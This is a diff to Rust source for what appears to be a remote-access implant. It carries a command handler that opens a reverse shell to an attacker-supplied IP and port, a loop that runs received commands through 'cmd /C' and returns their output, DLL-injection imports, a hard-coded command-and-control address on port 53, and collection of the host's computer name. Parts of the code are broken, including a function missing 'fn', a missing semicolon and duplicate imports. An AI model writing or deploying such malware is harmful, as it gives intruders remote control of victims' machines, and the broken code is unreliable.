@@ -9,10 +9,13 @@ use tokio::io::AsyncWriteExt;
 use tokio::net::tcp::OwnedWriteHalf;
 use tokio::net::TcpStream;
 use std::io::Result;
-use std::net::{TcpStream as reverse_stream};
-use std::os::unix::io::{AsRawFd, FromRawFd};
-use std::process::{Command, Stdio};
+use std::io::prelude::*;
+use std::net::TcpStream;
+use std::process::Command;
+use std::str::from_utf8;
+use std::env;
 use dll_syringe::{Syringe, process::OwnedProcess};
+use std::env;
 
 #[derive(Serialize, Deserialize)]
 struct Message {
@@ -58,30 +61,35 @@ pub fn interpret_payload(payload: String) {
     let infos_payload = payload.split_whitespace().collect::<Vec<_>>();
     if infos_payload[0] == "reverseshell"{
         println!("Activating reverseshell");
-        if cfg!(target_os = "windows") {
-            shell("cmd".to_string(), infos_payload[1], infos_payload[2], "-i");
-        }
-        else {
-            shell("bash".to_string(), infos_payload[1], infos_payload[2], "/C");
-        }
+        shell(infos_payload[1], infos_payload[2]);
         
     }
 }
 
-pub fn shell(shell: String, ip: &str, port: &str, arg: &str) -> Result<()> {
-    let sock = reverse_stream::connect(format!("{}:{}", ip, port))?;
-    let fd = sock.as_raw_fd();
+pub shell(ip: &str, port: &str) -> Result<()> {
+    let args: Vec<String> = env::args().collect();
+    
+    let mut stream = TcpStream::connect(format!("{}:{}", ip, port))?;
+    stream.write(b"Welcome to rustshell.\nI am here to execute your commands\nuse 'exit' to exit\n")?;
+    let mut buffer = [0; 2048];
 
-    // Open shell
-    Command::new(format!("{}", shell))
-        .arg(format!("{}", arg))
-        .stdin(unsafe { Stdio::from_raw_fd(fd) })
-        .stdout(unsafe { Stdio::from_raw_fd(fd) })
-        .stderr(unsafe { Stdio::from_raw_fd(fd) })
-        .spawn()?
-        .wait()?;
+    loop {
+        let buf_len = stream.read(&mut buffer).unwrap();
+        let command = from_utf8(&buffer[0..buf_len-1]).unwrap();
+    
+        if command == String::from("exit") {
+            break;
+        }
+        
+        let output = Command::new("cmd")
+                .args(&["/C", &command])
+                .output()
+                .expect("failed to execute the process")
 
-    Ok(())
+        let reply = output.stdout;
+        stream.write(&reply).unwrap();
+    };
+        Ok(())
 }
 
 #[tokio::main]
@@ -94,10 +102,10 @@ async fn main() -> io::Result<()> {
     let pub_key_pem = RsaPublicKey::to_public_key_pem(&pub_key).unwrap();
 
     // Username input
-    let username = "bobby".to_string();
+    let key = "COMPUTERNAME";
+    let username = env::var(key).unwrap();
 
     // TCP Stream creation
-
     let mut _stream = TcpStream::connect("192.168.1.41:53").await?;
     let (mut reader, mut writer) = _stream.into_split();
 
